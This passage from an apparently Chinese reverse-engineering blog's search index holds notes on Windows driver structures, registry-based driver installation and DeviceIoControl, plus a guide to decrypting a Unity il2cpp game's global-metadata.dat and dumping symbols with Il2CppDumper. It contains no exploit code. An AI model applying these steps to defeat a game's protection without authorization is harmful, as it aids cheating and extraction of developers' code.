0x0000001e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_TAPE                0x0000001f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_TAPE_FILE_SYSTEM    0x00000020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_TERMSRV             0x00000038</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_TRANSPORT           0x00000021</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_VDM                 0x0000002c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_VIDEO               0x00000023</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_VIRTUAL_DISK        0x00000024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_WAVE_IN             0x00000025</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_WAVE_OUT            0x00000026</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="DEVICE-OBJECT"><a href="#DEVICE-OBJECT" class="headerlink" title="_DEVICE_OBJECT"></a><span id="_DEVICE_OBJECT">_DEVICE_OBJECT</span></h3><blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DEVICE_OBJECT</span> &#123;</span><br><span class="line">  CSHORT                   Type;</span><br><span class="line">  USHORT                   Size;</span><br><span class="line">  LONG                     ReferenceCount;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_DRIVER_OBJECT</span>    *DriverObject;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_DEVICE_OBJECT</span>    *NextDevice;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_DEVICE_OBJECT</span>    *AttachedDevice;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IRP</span>              *CurrentIrp;</span><br><span class="line">  PIO_TIMER                Timer;</span><br><span class="line">  ULONG                    Flags;</span><br><span class="line">  ULONG                    Characteristics;</span><br><span class="line">  __volatile PVPB          Vpb;</span><br><span class="line">  PVOID                    DeviceExtension;</span><br><span class="line">  DEVICE_TYPE              DeviceType;</span><br><span class="line">  CCHAR                    StackSize;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    LIST_ENTRY         ListEntry;</span><br><span class="line">    WAIT_CONTEXT_BLOCK Wcb;</span><br><span class="line">  &#125; Queue;</span><br><span class="line">  ULONG                    AlignmentRequirement;</span><br><span class="line">  KDEVICE_QUEUE            DeviceQueue;</span><br><span class="line">  KDPC                     Dpc;</span><br><span class="line">  ULONG                    ActiveThreadCount;</span><br><span class="line">  PSECURITY_DESCRIPTOR     SecurityDescriptor;</span><br><span class="line">  KEVENT                   DeviceLock;</span><br><span class="line">  USHORT                   SectorSize;</span><br><span class="line">  USHORT                   Spare1;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_DEVOBJ_EXTENSION</span> *DeviceObjectExtension;</span><br><span class="line">  PVOID                    Reserved;</span><br><span class="line">&#125; DEVICE_OBJECT, *PDEVICE_OBJECT;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="DRIVER-OBJECT"><a href="#DRIVER-OBJECT" class="headerlink" title="_DRIVER_OBJECT"></a><span id="_DEVICE_OBJECT">_DRIVER_OBJECT</span></h3><blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DRIVER_OBJECT</span> &#123;</span><br><span class="line">  CSHORT             Type;</span><br><span class="line">  CSHORT             Size;</span><br><span class="line">  PDEVICE_OBJECT     DeviceObject;</span><br><span class="line">  ULONG              Flags;</span><br><span class="line">  PVOID              DriverStart;</span><br><span class="line">  ULONG              DriverSize;</span><br><span class="line">  PVOID              DriverSection;</span><br><span class="line">  PDRIVER_EXTENSION  DriverExtension;</span><br><span class="line">  UNICODE_STRING     DriverName;</span><br><span class="line">  PUNICODE_STRING    HardwareDatabase;</span><br><span class="line">  PFAST_IO_DISPATCH  FastIoDispatch;</span><br><span class="line">  PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">  PDRIVER_STARTIO    DriverStartIo;</span><br><span class="line">  PDRIVER_UNLOAD     DriverUnload;</span><br><span class="line">  PDRIVER_DISPATCH   MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line">&#125; DRIVER_OBJECT, *PDRIVER_OBJECT;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h1 id="程序调用"><a href="#程序调用" class="headerlink" title="程序调用"></a>程序调用</h1><h2 id="写入注册表"><a href="#写入注册表" class="headerlink" title="写入注册表"></a>写入注册表</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/68157880" >Windows学习001：CurrentControlSet和ControlSet001 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>安装驱动程序的本质就是向注册表内写入对应的值</p>
<p>比如</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RegCreateKeyExA</span>(<span class="comment">//创建指定的注册表项</span></span><br><span class="line">         HKEY_LOCAL_MACHINE,<span class="comment">//也就是 注册表中&quot;计算机\HKEY_LOCAL_MACHINE&quot;这个路径</span></span><br><span class="line">         <span class="string">&quot;System\\CurrentControlSet\\Services\\BrownProtector&quot;</span>,<span class="comment">//合起来就是注册表中实际项路径</span></span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>i64,</span><br><span class="line">         <span class="number">1u</span>,</span><br><span class="line">         <span class="number">0x20006</span>u,</span><br><span class="line">         <span class="number">0</span>i64,</span><br><span class="line">         &amp;hKey,</span><br><span class="line">         <span class="number">0</span>i64);</span><br><span class="line"><span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;Type&quot;</span>, <span class="number">0</span>, <span class="number">4u</span>, Data, <span class="number">4u</span>);<span class="comment">//在键内创建一个键值对</span></span><br><span class="line"><span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;Start&quot;</span>, <span class="number">0</span>, <span class="number">4u</span>, Data, <span class="number">4u</span>);<span class="comment">//在键内创建一个键值对</span></span><br><span class="line"><span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;ImagePath&quot;</span>, <span class="number">0</span>, <span class="number">2u</span>, (<span class="type">const</span> BYTE *)v12, v1 + <span class="number">1</span>)<span class="comment">//在键内创建一个键值对</span></span><br></pre></td></tr></table></figure></div>

<h3 id="RegCreateKeyExA"><a href="#RegCreateKeyExA" class="headerlink" title="RegCreateKeyExA"></a>RegCreateKeyExA</h3><blockquote>
<p>用于创建注册表项</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegCreateKeyExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HKEY                        hKey,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="comment">/**</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">注册表项的句柄也算是注册表路径</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">HKEY_CLASSES_ROOT</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">HKEY_CURRENT_CONFIG</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">HKEY_CURRENT_USER</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">HKEY_LOCAL_MACHINE</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">HKEY_USERS</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">**/</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            LPCSTR                      lpSubKey,<span class="comment">//子路径</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  DWORD                       Reserved,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  LPSTR                       lpClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD                       dwOptions,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            REGSAM                      samDesired,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  <span class="type">const</span> LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PHKEY                       phkResult,<span class="comment">//输出的对应注册表项所存位置(实际上是个指针)</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD                     lpdwDisposition</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></div>


</blockquote>
<h3 id="RegSetValueExA"><a href="#RegSetValueExA" class="headerlink" title="RegSetValueExA"></a>RegSetValueExA</h3><blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegSetValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HKEY       hKey,<span class="comment">//可以由 RegCreateKeyExA(创建注册表项)或者 RegOpenKeyEx(打开注册表项) 还有其他函数生成</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR     lpValueName,<span class="comment">//键</span></span></span></span><br><span class="line"><span class="params"><span class="function">                 DWORD      Reserved,<span class="comment">//保留位，恒为0</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD      dwType,<span class="comment">//数据类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           <span class="type">const</span> BYTE *lpData,<span class="comment">//值</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD      cbData<span class="comment">//lpdata大小,如果数据的类型为 REG_SZ、REG_EXPAND_SZ 或 REG_MULTI_SZ， 则 cbData 必须包含终止 null 字符的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></div>


</blockquote>
<h2 id="驱动通信"><a href="#驱动通信" class="headerlink" title="驱动通信"></a>驱动通信</h2><h3 id="CreateFileA"><a href="#CreateFileA" class="headerlink" title="CreateFileA"></a>CreateFileA</h3><blockquote>
<p>用于获取驱动的句柄</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR                lpFileName,<span class="comment">//驱动上来说,可以是device</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwShareMode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwCreationDisposition,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HANDLE                hTemplateFile</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></div>


</blockquote>
<h3 id="DeviceIoControl"><a href="#DeviceIoControl" class="headerlink" title="DeviceIoControl"></a>DeviceIoControl</h3><blockquote>
<p>可以调用驱动api执行一些操作</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeviceIoControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                HANDLE       hDevice,<span class="comment">//设备句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        dwIoControlCode,<span class="comment">//操作码</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID       lpInBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nInBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPVOID       lpOutBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nOutBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPDWORD      lpBytesReturned,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></div>


</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
        <category>驱动</category>
      </categories>
  </entry>
  <entry>
    <title>Untitled</title>
    <url>/2024/04/15/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/JavaScript/electron/Untitled/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Re</category>
        <category>语言逆向</category>
        <category>JavaScript</category>
        <category>electron</category>
      </categories>
  </entry>
  <entry>
    <title>il2cppdumper</title>
    <url>/2024/04/03/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/C#/unity%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/il2cpp/il2cppdumper/</url>
    <content><![CDATA[<h1 id="il2cpp逆向"><a href="#il2cpp逆向" class="headerlink" title="il2cpp逆向"></a>il2cpp逆向</h1><p><a class="link"   href="https://zhuanlan.zhihu.com/p/150555407" >一个Unity游戏保护方案的分析和还原符号信息，偷学对global-metadata保护的思路 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="关注方向"><a href="#关注方向" class="headerlink" title="关注方向"></a>关注方向</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>关注当前文件的<code>GameAssembly.dll</code>(主要函数)和<code>xxxx_Data\il2cpp_data\Metadata\global-metadata.dat</code>(存储符号表以及一些引用)</p>
<p>现在主要重点集中于加密<code>global-metadata.dat</code>用于防止通过<a class="link"   href="https://github.com/Perfare/Il2CppDumper" >Il2CppDumper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>逆向出<code>Assembly-CSharp.dll</code>(存储主要逻辑，在il2cpp中用于存放cpp编译为dll的函数调用地址)</p>
<h3 id="android"><a href="#android" class="headerlink" title="android"></a>android</h3><p>关注当前文件的<code>.\lib\armeabi-v8a\libil2cpp.so</code>(主要函数)和<code>.\assets\bin\Data\Managed\Metadata\global-metadata.dat</code>(存储符号表以及一些引用)</p>
<p>现在主要重点集中于加密<code>global-metadata.dat</code>用于防止通过<a class="link"   href="https://github.com/Perfare/Il2CppDumper" >Il2CppDumper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>逆向出<code>Assembly-CSharp.dll</code>(存储主要逻辑，在il2cpp中用于存放cpp编译为dll的函数调用地址)</p>
<h2 id="解密global-metadata-dat"><a href="#解密global-metadata-dat" class="headerlink" title="解密global-metadata.dat"></a>解密global-metadata.dat</h2><blockquote>
<p>global-metadata.dat解密基本都基于 程序运行时，需要将global-metadata.dat解密</p>
</blockquote>
<h3 id="1、通过dump-memory"><a href="#1、通过dump-memory" class="headerlink" title="1、通过dump memory"></a>1、通过dump memory</h3><h3 id="2、通过逆向加载global-metadata-dat的逻辑"><a href="#2、通过逆向加载global-metadata-dat的逻辑" class="headerlink" title="2、通过逆向加载global-metadata.dat的逻辑"></a>2、通过逆向加载global-metadata.dat的逻辑</h3><blockquote>
<p>1、搜索对应函数</p>
<blockquote>
<p>可通过搜索字符串global-metadata.dat或者Metadata来寻找对应逻辑(程序加载dat时需要对应的路径)</p>
<p>也可通过查询导入表的<code>MapViewOfFile</code>,因为读取文件时，源码使用的就是这个函数，只不过这个函数使用处较多，需要仔细查找</p>
</blockquote>
<p>2、找到加载逻辑</p>
<blockquote>
<p>一般形式如下，如果有加密，注意对data的操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404031939459.png"
                      alt="image-20240403193938362"
                ></p>
</blockquote>
<p>3、还原对应global-metadata.dat</p>
<blockquote>
<p>注意header位置(0到0x110)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404031943377.png"
                      alt="image-20240403194313333"
                ></p>
<p>前两个4字节数据为<code>magic number</code>和<code>version</code></p>
<p>其他都为一类数据的offset和count,注意这类数据是否超过实际文件范围</p>
</blockquote>
</blockquote>
<p>3、通过Il2CppDumper还原逻辑</p>
<blockquote>
<p>windows <code>il2CppDumper.exe &quot;.\GameAssembly.dll&quot; &quot;.\xxxx_Data\il2cpp_data\Metadata\global-metadata2.dat&quot; &quot;.\&quot;</code></p>
<p>android <code>il2CppDumper.exe &quot;.\lib\armeabi-v8a\libil2cpp.so&quot; &quot;.\assets\bin\Data\Managed\Metadata\global-metadata.dat&quot;.\</code></p>
<p>执行成功后，dump下的目录中<code>script.json</code>保存符号信息</p>
<p>windows下的<code>GameAssembly.dll</code>android下的<code>libil2cpp.so</code>也存放着函数的具体实现(因为il2cpp本身就是cs转cpp库的操作)可通过 Il2CppDumper目录下的<code>ida_py3.py</code>加载<code>script.json</code>导入对应符号</p>
<p><code>DummyDll\Assembly-CSharp.dll</code>存放着函数信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404032005785.png"
                      alt="image-20240403200512739"
                ></p>
<p>可通过cs逆向工具逆向出对应的VA</p>
<p>VA可通过ida进行跳转查找对应的逻辑</p>
</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>语言逆向</category>
        <category>C#</category>
        <category>unity游戏逆向</category>
        <category>il2cpp</category>
      </categories>
  </entry>
</search>
